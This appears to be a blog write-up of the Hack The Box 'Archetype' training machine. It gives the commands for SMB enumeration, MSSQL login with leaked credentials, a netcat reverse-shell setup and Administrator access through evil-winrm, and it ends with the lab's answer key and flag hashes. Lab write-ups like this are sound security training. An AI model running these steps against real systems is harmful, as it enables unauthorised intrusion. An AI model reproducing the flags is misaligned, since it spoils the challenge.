---
layout: single
title: Archetype - Hack The Box
excerpt: "In this machine, we take advantage of an SMB misconfiguration, exploit an MSSQL database, and escalate privileges through regular expressions in a Windows system."
date: 2025-03-12
classes: wide
header:
  teaser: /img2/archetype.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Very Easy
tags:
  - SMB
  - MSSQL
  - Windows Privilege Escalation
---



![](/img2/Pasted%20image%2020250312171234.png)

## Introduction

> In this machine, we take advantage of an SMB misconfiguration, exploit an MSSQL database, and escalate privileges through regular expressions in a Windows system.

## Reconnaissance

- Connectivity

```bash
ping -c1 10.129.95.187
```

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.95.187
```

![](/img2/Pasted%20image%2020250312171557.png)

- SMB service enumeration

```bash
smbclient -L 10.129.95.187 -N
```

![](/img2/Pasted%20image%2020250312171901.png)

- Get backups content

```bash
smbclient //10.129.95.187/backups -N
```

![](/img2/Pasted%20image%2020250312172345.png)

```bash
cat prod.dtsConfig
```

![](/img2/Pasted%20image%2020250312172525.png)


## Exploitation

- Connect to MSSQL database

```bash
tsql -H 10.129.95.187 -p 1433 -U "ARCHETYPE\sql_svc" -P "M3g4c0rp123"
```

![](/img2/Pasted%20image%2020250312180107.png)

- Reverse shell

- Download files and upload in Python HTTP server

```bash
python3 -m http.server 8000
```

![](/img2/Pasted%20image%2020250312201446.png)

- Install nc.exe in Windows machine

![](/img2/Pasted%20image%2020250312184620.png)

- Send reverse shell

![](/img2/Pasted%20image%2020250312194628.png)

```bash
nc -nlvp 9000
```

![](/img2/Pasted%20image%2020250312184828.png)

## Post-exploitation

- Get user flag

![](/img2/Pasted%20image%2020250312180914.png)

- List all txt files

```powershell
dir -Force -Recurse C:\Users\*.txt 2>$null | sls -Pattern "admin" 2>$null | Select-Object -Unique Path
```

![](/img2/Pasted%20image%2020250312195031.png)

> dir -Force -Recurse * .txt --> List all txt files and directories

> sls -Pattern "admin" --> Search "admin" word 

> select -Unique Path --> Show unique path

- Open file

```bash
cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![](/img2/Pasted%20image%2020250312201301.png)

- Connect with Administrator user

```bash
evil-winrm -i 10.129.95.187 -u Administrator -p MEGACORP_4dm1n\!\!
```

![](/img2/Pasted%20image%2020250312202327.png)

## Tasks

1. Which TCP port is hosting a database server?
> 1433

2. What is the name of the non-Administrative share available over SMB?
> backups

3. What is the password identified in the file on the SMB share?
> M3g4c0rp123

4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
> mssqlclient.py

5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
> xp_cmdshell

6. What script can be used in order to search possible paths to escalate privileges on Windows hosts?
> winPeas

7. What file contains the administrator's password?
> ConsoleHost_history.txt

8. Submit user flag
> 3e7b102e78218e935bf3f4951fec21a3

9. Submit root flag
> b91ccec3305e98240082d4474b848528


![](/img2/Pasted%20image%2020250312202923.png)